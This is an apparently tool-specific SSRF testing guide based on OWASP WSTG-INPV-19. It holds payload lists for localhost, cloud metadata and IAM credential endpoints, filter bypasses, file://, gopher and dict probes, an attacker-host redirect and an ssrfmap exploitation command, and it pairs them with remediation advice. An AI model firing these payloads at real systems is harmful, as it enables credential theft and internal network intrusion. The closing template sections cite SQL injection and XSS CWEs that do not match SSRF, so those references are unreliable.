---
id: WSTG-INPV-19
title: Testing for Server-Side Request Forgery
category: Input Validation
severity_range: Medium-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server_Side_Request_Forgery
---

# WSTG-INPV-19: Testing for Server-Side Request Forgery (SSRF)

## Summary

Server-Side Request Forgery (SSRF) occurs when an attacker can make the server perform HTTP requests to arbitrary destinations. This can be used to access internal services, cloud metadata endpoints, bypass firewalls, and scan internal networks.

## Test Objectives

- Identify parameters that accept URLs or hostnames
- Test if the server makes requests to attacker-controlled or internal destinations
- Assess the impact (internal service access, cloud metadata, file access)

## Prerequisites

- Target application has URL-fetching functionality (URL preview, webhooks, file import from URL, PDF generation from URL, image proxy)
- Docker pentest container capturing traffic

## Test Steps

### Step 1: Identify SSRF Vectors

**CLI Actions:**
1. Use `curl` to find parameters accepting URLs:
   - `?url=`, `?uri=`, `?path=`, `?src=`, `?dest=`, `?redirect=`
   - `?domain=`, `?host=`, `?site=`, `?feed=`
   - Webhook configuration URLs
   - PDF/screenshot generation URLs
   - File import/export URLs
   - Avatar/image URL fields
2. Use `curl` with pattern `(url|uri|path|src|dest|link|href|callback|webhook)=http` to find URL parameters

### Step 2: Test Basic SSRF

**CLI Actions:**
Use `curl` to test if the server fetches attacker-specified URLs:

**External canary (out-of-band):**
```
GET /fetch?url=http://your-collaborator-domain/ssrf-test HTTP/1.1
Host: target.com
```

**Localhost access:**
```
GET /fetch?url=http://127.0.0.1/ HTTP/1.1
GET /fetch?url=http://localhost/ HTTP/1.1
GET /fetch?url=http://[::1]/ HTTP/1.1
GET /fetch?url=http://0.0.0.0/ HTTP/1.1
```

### Step 3: Test Internal Network Access

**CLI Actions:**
Use `curl` to probe common internal services:

```
GET /fetch?url=http://127.0.0.1:8080 HTTP/1.1
GET /fetch?url=http://127.0.0.1:3000 HTTP/1.1
GET /fetch?url=http://127.0.0.1:6379 HTTP/1.1
GET /fetch?url=http://192.168.1.1 HTTP/1.1
GET /fetch?url=http://10.0.0.1 HTTP/1.1
GET /fetch?url=http://172.16.0.1 HTTP/1.1
```

### Step 4: Test Cloud Metadata Access

**CLI Actions:**
Use `curl` to test cloud metadata endpoints:

**AWS:**
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
```

**GCP:**
```
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
```

**Azure:**
```
GET /fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1
```

### Step 5: Test Filter Bypasses

**CLI Actions:**
If basic payloads are blocked, test bypass techniques with `curl`:

```
http://127.1
http://0177.0.0.1       (octal)
http://2130706433        (decimal)
http://0x7f000001        (hex)
http://127.0.0.1.nip.io
http://[0:0:0:0:0:ffff:127.0.0.1]
http://localtest.me
http://spoofed.oob-callback.example  (DNS rebinding)
```

URL encoding:
```
http://127.0.0.1/%2f
http://%31%32%37%2e%30%2e%30%2e%31
```

Redirect-based:
```
http://attacker.com/redirect?to=http://169.254.169.254
```

### Step 6: Test Non-HTTP Protocols

**CLI Actions:**
Use `curl` to test if other protocols are supported:

```
GET /fetch?url=file:///etc/passwd HTTP/1.1
GET /fetch?url=gopher://127.0.0.1:6379/_INFO HTTP/1.1
GET /fetch?url=dict://127.0.0.1:6379/INFO HTTP/1.1
GET /fetch?url=ftp://127.0.0.1/ HTTP/1.1
```

## Payloads

### Localhost Variations
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://127.1
http://127.0.1
http://0
http://0177.0.0.1
http://2130706433
http://0x7f000001
http://0x7f.0x0.0x0.0x1
http://127.0.0.1.nip.io
http://localtest.me
http://127.0.0.1:80@attacker.com
```

### Cloud Metadata Endpoints
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance
http://169.254.169.254/metadata/v1/
```

### Internal Network Probing
```
http://10.0.0.1
http://172.16.0.1
http://192.168.0.1
http://192.168.1.1
http://internal-service.local
```

### Protocol-Based Payloads
```
file:///etc/passwd
file:///etc/hostname
file:///proc/self/environ
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
dict://127.0.0.1:6379/INFO
```

### Automated Testing with ssrfmap

**CLI Actions:**
Use `ssrfmap` for automated SSRF detection and exploitation:

First, create a request file with the vulnerable parameter marked as `XXXX`:
```
GET /fetch?url=XXXX HTTP/1.1
Host: target.com
```

Then run ssrfmap:
```bash
rynix_plugin_run('wstg') python3 /opt/ssrfmap/ssrfmap.py -r request.txt -p url -m readfiles
```

Available modules: `readfiles` (read local files), `portscan` (scan internal ports), `networkscan` (scan internal network), `aws` (AWS metadata), `gce` (GCP metadata). Always verify ssrfmap's findings manually with curl before logging.

## Detection Criteria

A finding should be logged when:
- The server fetches content from attacker-controlled URLs (OOB interaction)
- Internal service responses are returned (localhost, internal IPs)
- Cloud metadata is accessible
- File protocol reads local files
- Internal network scanning is possible (different responses for open/closed ports)

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Cloud metadata with IAM credentials accessible | Critical |
| Internal services accessible (databases, admin panels) | High |
| Local file reading via file:// protocol | High |
| Blind SSRF confirmed via OOB interaction | Medium |
| Internal network port scanning possible | Medium |
| SSRF limited to HTTP/HTTPS, external only | Low |

## Remediation

- Validate and sanitize all user-supplied URLs
- Use an allowlist of permitted domains/IPs
- Block requests to internal/private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)
- Block requests to cloud metadata endpoints
- Disable unnecessary URL protocols (file://, gopher://, dict://)
- Use a dedicated HTTP client that doesn't follow redirects (or validates redirect targets)
- Run URL-fetching functionality in an isolated network segment
- Implement egress filtering at the network level

## References

- [OWASP Testing Guide - Server-Side Request Forgery](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server_Side_Request_Forgery)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

